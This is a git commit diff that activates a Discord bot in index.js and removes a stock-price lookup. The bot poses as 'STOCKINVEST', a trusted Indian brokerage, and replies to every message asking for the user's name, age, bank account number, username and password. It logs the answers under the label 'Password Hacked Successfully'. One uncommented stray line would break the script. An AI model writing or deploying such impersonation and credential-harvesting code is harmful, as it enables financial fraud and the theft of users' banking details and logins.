299fcadd2f9395ad838a3f359876be5048a48b87
Manoj D Maiya <91108665+Manojdmaiya@users.noreply.github.com>
2024-01-12 17:49:55 +0530

    Update index.js

--- index.js
+++ index.js
@@ -1,49 +1,40 @@
-// const { Client, GatewayIntentBits } = require("discord.js");
+ const { Client, GatewayIntentBits } = require("discord.js");
 
-// const client = new Client({
-//     intents: [GatewayIntentBits.Guilds, 
-//         GatewayIntentBits.GuildMessages, 
-//         GatewayIntentBits.MessageContent],
+ const client = new Client({
+     intents: [GatewayIntentBits.Guilds, 
+        GatewayIntentBits.GuildMessages, 
+        GatewayIntentBits.MessageContent],
 
-// });
-// //guilds - update,add,delete messages 
+ });
+guilds - update,add,delete messages 
 
 
-// client.on('messageCreate', (message) => {
-//     if(message.author.bot) return;
+ client.on('messageCreate', (message) => {
+     if(message.author.bot) return;
      
-//     message.reply({
-//         content: "Hi, This is from STOCKINVEST.The most trusted stock market news and brokerage of India , all details are available here . Please enter your Name, age and  banking account number and other details for verification , Type Yes to join",
-//     });
-    
-//     if(message.content==="Yes") {
-//      message.reply({
-//         content: "Type Username and password",
-//     });
-     
-// }
-//  console.log("Password Hacked Successfully : ")  
-// console.log(message.content);
-//    return;
-// });
-
-
-
-// client.on('interactionCreate', interaction => {
-//     console.log(interaction);
-//     interaction.reply("Pong!!");
-// })
-
-// client.login(
-//     "LOGIN_ID"
-// );
-
-const liveStockPrice = require('live-stock-price');
-
-liveStockPrice('CSCO')
-    .then((price) => {
-        console.log('Stock price:', price);
-    })
-    .catch((error) => {
-        console.error('Error:', error);
+     message.reply({
+        content: "Hi, This is from STOCKINVEST.The most trusted stock market news and brokerage of India , all details are available here . Please enter your Name, age and  banking account number and other details for verification , Type Yes to join",
     });
+    
+    if(message.content==="Yes") {
+     message.reply({
+       content: "Type Username and password",
+    });
+     
+ }
+  console.log("Password Hacked Successfully : ")  
+ console.log(message.content);
+   return;
+ });
+
+
+
+ client.on('interactionCreate', interaction => {
+     console.log(interaction);
+     interaction.reply("Pong!!");
+ })
+
+ client.login(
+    "LOGIN_ID"
+ );
+
